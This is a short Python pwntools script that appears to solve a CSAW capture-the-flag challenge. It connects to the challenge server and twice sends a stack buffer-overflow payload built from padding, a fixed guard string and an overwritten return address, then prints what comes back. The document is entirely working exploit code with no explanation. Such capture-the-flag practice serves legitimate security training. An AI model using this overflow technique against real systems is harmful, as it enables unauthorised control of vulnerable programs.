from pwn import *

payload = "a"*32 + "NECGLSPQ" + "b"*20 + "\xa6\x86\x04\x08"

io = remote("pwn.red.csaw.io", 5005)

io.recv()

io.sendline(payload)

io.recv()

io.sendline(payload)

print(io.recv())
